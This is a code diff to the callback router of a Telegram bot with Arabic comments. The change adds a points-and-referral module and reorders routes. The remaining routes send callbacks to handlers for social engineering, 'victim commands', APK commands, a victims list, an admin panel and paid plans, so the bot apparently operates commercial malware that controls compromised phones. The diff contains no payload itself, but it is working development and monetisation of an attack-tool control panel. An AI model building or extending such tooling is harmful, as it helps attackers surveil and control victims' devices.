@@ -1,7 +1,7 @@
 # bot_handlers/callbacks/router.py
 # ============================================================
 # الموجّه الرئيسي — يوزّع الـ callback للـ handler المناسب
-# v2 — مع دعم الهندسة الاجتماعية (gen_se + se_*)
+# v3 — مع دعم الهندسة الاجتماعية + النقاط والإحالات
 # ============================================================
 
 from config import bot
@@ -29,12 +29,22 @@ from . import misc as misc_cb
 # ★★★ هندسة اجتماعية ★★★
 from . import social_engineering as se_cb
 
+# ★★★ نقاط وإحالات ★★★
+from . import points as points_cb
+
 
 # ══════════════════════════════════════════════════
 # ★ ترتيب الفحص (الأهم أولاً)
 # ══════════════════════════════════════════════════
 ROUTES = [
-    # ─── 0. ★ الهندسة الاجتماعية (gen_se + se_*) ★ ───
+    # ─── 0. ★ نقاط وإحالات (قبل كل شيء) ★ ───
+    (lambda d: d == "points_menu"
+               or d.startswith("my_referral")
+               or d.startswith("points_")
+               or d == "how_to_earn"
+               or d == "my_referrals", points_cb.handle),
+
+    # ─── 0.5. ★ الهندسة الاجتماعية ★ ───
     (lambda d: d == "gen_se" or d.startswith("se_"), se_cb.handle),
 
     # ─── 1. misc (noop, back) ───
@@ -59,22 +69,25 @@ ROUTES = [
     # ─── 7. dashboard ───
     (lambda d: d == "open_dashboard", dash_cb.handle),
 
-    # ─── 8. payment ───
-    (lambda d: d in ("payment_menu", "show_plans", "my_account") or d.startswith("buy_plan_"), payment_cb.handle),
+    # ─── 8. payment (legacy) ───
+    (lambda d: d in ("payment_menu", "show_plans") or d.startswith("buy_plan_"), payment_cb.handle),
+
+    # ─── 8.5. my_account (يدعم النقاط) ───
+    (lambda d: d == "my_account", payment_cb.handle),
 
     # ─── 9. updates ───
     (lambda d: d.startswith("upd_"), upd_cb.handle),
 
-    # ─── 10. ★ admin (قبل victim_commands و v_) ★ ───
+    # ─── 10. ★ admin ★ ───
     (lambda d: d == "admin_panel" or d.startswith("admin_"), admin_cb.handle),
 
-    # ─── 11. victim commands (vcmd_) ───
+    # ─── 11. victim commands ───
     (lambda d: d.startswith("vcmd_"), vcmd_cb.handle),
 
-    # ─── 12. apk commands (apk_cmd_) ───
+    # ─── 12. apk commands ───
     (lambda d: d.startswith("apk_cmd_"), apk_cmd_cb.handle),
 
-    # ─── 13. victims (v_*) ───
+    # ─── 13. victims ───
     (lambda d: d.startswith("v_"), victims_cb.handle),
 ]
 
